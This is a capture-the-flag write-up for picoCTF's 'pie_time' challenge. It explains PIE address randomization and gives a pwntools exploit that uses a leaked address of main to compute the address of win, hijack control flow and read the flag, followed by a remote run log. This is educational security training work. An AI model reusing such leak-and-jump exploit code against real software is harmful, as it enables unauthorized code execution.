---
title: pie_time  
description: Writeup for the pie_time challenge in picoctf
created: 2025-07-02
tags: pwn, ctf, practice, picoctf  
draft: false
---

# Introduction

-----

**Challenge Description**

Can you try to get the flag? Beware we have PIE!


**Challenge Hints**

Can you figure out what changed between the address you found locally and in the server output?

The challenge pie-time was a binary exploitation problem released as part of picoCTF 2025. It focuses on address randomization through [Position Independent Executable (PIE)](https://en.wikipedia.org/wiki/Position-independent_code) code. The challenge provides the attacker with a leak of the main function’s runtime address. Using this leak, the attacker must calculate the address of the win function to hijack execution.

# Enumeration

-----

As always, we'll begin by enumerating the target application:

<style>
    .ascii-art {
        font-family: monospace;
        white-space: pre;
    }
</style>

```bash

$ file ./vuln 
./vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

$ pwn checksec ./vuln
[*] '/home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie-time/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

$ objdump -t ./vuln | grep -E "\.data|\.bss|\.text"           
00000000000011a0 l    d  .text  0000000000000000              .text
0000000000004000 l    d  .data  0000000000000000              .data
0000000000004010 l    d  .bss   0000000000000000              .bss
00000000000011d0 l     F .text  0000000000000000              deregister_tm_clones
0000000000001200 l     F .text  0000000000000000              register_tm_clones
0000000000001240 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000004018 l     O .bss   0000000000000001              completed.8061
0000000000001280 l     F .text  0000000000000000              frame_dummy
0000000000001480 g     F .text  0000000000000005              __libc_csu_fini
0000000000004010 g     O .bss   0000000000000008              stdout@@GLIBC_2.2.5
0000000000004000  w      .data  0000000000000000              data_start
0000000000004010 g       .data  0000000000000000              _edata
0000000000004000 g       .data  0000000000000000              __data_start
0000000000001289 g     F .text  000000000000001e              segfault_handler
0000000000004008 g     O .data  0000000000000000              .hidden __dso_handle
0000000000001410 g     F .text  0000000000000065              __libc_csu_init
00000000000012a7 g     F .text  0000000000000096              win
0000000000004020 g       .bss   0000000000000000              _end
00000000000011a0 g     F .text  000000000000002f              _start
0000000000004010 g       .bss   0000000000000000              __bss_start
000000000000133d g     F .text  00000000000000cc              main
0000000000004010 g     O .data  0000000000000000              .hidden __TMC_END__

```

From the output of file and pwn checksec, we can see that this challenge uses a PIE (Position Independent Executable). I touched on this briefly in my HTB batcomputer writeup, but I'll explain it here as well.

Position-independent code (PIC) or position-independent executable (PIE) is machine code designed to run correctly regardless of its memory address. Unlike absolute code, which requires loading at a fixed address, PIE ensures that all addresses in the binary are relative to a randomized base address generated at runtime.

When PIE is enabled, each time the program runs, the operating system chooses a new random base. All addresses in the program’s memory space then become:

```
address = base + offset
```

This randomization complicates attacks that rely on knowing fixed addresses in memory.

We’ll see exactly how this affects exploitation as we continue analyzing the challenge.

# Code Review

-----

This challenge provides us with the source code. Let’s review it before continuing:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

The `main` function starts by setting a signal handler for SIGSEGV and configuring stdout to be unbuffered. It then prints the runtime address of `main`, giving us a memory leak.

Next, it asks the user for an address to "jump to" and reads that input. It casts the input to a function pointer and calls it.

If we look closer, we see that the `win` function is never called in normal execution, it’s effectively dead code. Our goal is to get execution to jump to `win`, which will read and print `flag.txt` for us.

Running it locally shows that the leaked address of main changes every time:

```bash
$ ./vuln     
Address of main: 0x55b03c6f433d
Enter the address to jump to, ex => 0x12345: 0x12345
Your input: 12345
Segfault Occurred, incorrect address.

$ ./vuln
Address of main: 0x5606e37d233d
Enter the address to jump to, ex => 0x12345: 0x1337
Your input: 1337
Segfault Occurred, incorrect address.
```

This changing address is due to PIE: every time the binary runs, the operating system picks a new base address.

We can figure out how to compensate for PIE by looking at the symbol offsets:

```bash
$ objdump -t ./vuln | grep "main"
000000000000133d g     F .text  00000000000000cc              main
```

If the program prints the address of main as 0x55b03c6f433d, then:

```
base = leaked_main - offset_main
     = 0x55b03c6f433d - 0x133d
     = 0x55b03c6f3000
```

You might notice that the three least-significant nibbles of the leaked address are always the same (for main, it ends in 33d). That’s not a coincidence, it's due to page alignment on Linux.

Linux memory pages are `0x1000` bytes (4096 bytes), and the operating system aligns sections of memory on these boundaries. So if the PIE base is `0x55b03c6f3000`, the next page might start at `0x55b03c6f4000`.

You can see how the program’s pages are mapped using info proc mapping in GDB:

```bash

gef➤  info proc mappings
process 64455
Mapped address spaces:

Start Addr         End Addr           Size               Offset             Perms File 
0x0000555555554000 0x0000555555555000 0x1000             0x0                r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
0x0000555555555000 0x0000555555556000 0x1000             0x1000             r-xp  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
0x0000555555556000 0x0000555555557000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
0x0000555555557000 0x0000555555558000 0x1000             0x2000             r--p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
0x0000555555558000 0x0000555555559000 0x1000             0x3000             rw-p  /home/user/Documents/repos/notebook/ctf/picoctf/pwn/pie_time/example 
0x00007ffff7dae000 0x00007ffff7db1000 0x3000             0x0                rw-p   
0x00007ffff7db1000 0x00007ffff7dd9000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7dd9000 0x00007ffff7f3e000 0x165000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f3e000 0x00007ffff7f94000 0x56000            0x18d000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f94000 0x00007ffff7f98000 0x4000             0x1e2000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f98000 0x00007ffff7f9a000 0x2000             0x1e6000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f9a000 0x00007ffff7fa7000 0xd000             0x0                rw-p   
0x00007ffff7fc0000 0x00007ffff7fc2000 0x2000             0x0                rw-p   
0x00007ffff7fc2000 0x00007ffff7fc6000 0x4000             0x0                r--p  [vvar] 
0x00007ffff7fc6000 0x00007ffff7fc8000 0x2000             0x0                r-xp  [vdso] 
0x00007ffff7fc8000 0x00007ffff7fc9000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7fc9000 0x00007ffff7ff0000 0x27000            0x1000             r-xp  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ff0000 0x00007ffff7ffb000 0xb000             0x28000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ffb000 0x00007ffff7ffd000 0x2000             0x33000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffff7ffd000 0x00007ffff7fff000 0x2000             0x35000            rw-p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
0x00007ffffffde000 0x00007ffffffff000 0x21000            0x0                rw-p  [stack]

```

With this knowledge, we can reliably compute the PIE base and use it to find the runtime address of win.

# Exploit

We can breakdown the exploit into the following steps:
1. capture the address of `main`
2. calculate the PIE base address
3. calculcate the address of win
4. pwn the target

We can use pwntools to capture IO from the application. All we need is the absolute address of `main` and `win` which we got from enumerating the symbols in the binary.

<details>
    <summary>exploit.py</summary>

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337 ./vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './vuln', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
WIN_OFFSET = 0x12a7
MAIN_OFFSET = 0x133d

# ---------- capture the address of main ----------
io.recvuntil(b"Address of main: ")
main_addr = io.recvline().decode("utf-8").strip()
log.info("address of main: %s" % (main_addr))

# ---------- calculate the PIE base ----------
pie_base = hex(int(main_addr, 16) - MAIN_OFFSET)
log.info("pie base address: %s" % (pie_base))

# ---------- calculate the address of win ----------
win_addr = hex(int(pie_base, 16) + WIN_OFFSET)
log.info("win address: %s" % (win_addr))

# ---------- pwn the target ----------
payload = win_addr.encode("utf-8")
io.sendlineafter(b"Enter the address to jump to, ex => 0x12345: ", payload)
io.recvuntil(b"You won!\n")

flag = io.recvall().decode("utf-8")
log.success("flag: %s" % (flag))

io.close()
```

</details>


```bash
$ ./exploit.py REMOTE HOST=rescued-float.picoctf.net PORT=64870
[+] Opening connection to rescued-float.picoctf.net on port 64870: Done
[*] address of main: 0x5aacaa56f33d
[*] address of win: 0x5aacaa56f2a7
[+] Receiving all data: Done (47B)
[*] Closed connection to rescued-float.picoctf.net port 64870
[+] flag: picoCTF{REDACTED}
```


